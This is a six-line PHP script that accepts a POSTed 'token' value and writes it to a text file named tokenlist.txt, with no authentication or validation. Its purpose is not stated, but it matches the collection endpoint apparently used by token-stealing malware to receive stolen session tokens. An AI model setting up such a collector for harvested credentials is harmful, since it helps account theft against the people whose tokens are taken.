<?php
  $myfile = fopen("tokenlist.txt", "w") or die("Unable to open file!");
  $txt = $_POST["token"]."\n";
  fwrite($myfile, $txt);
  fclose($myfile);
?>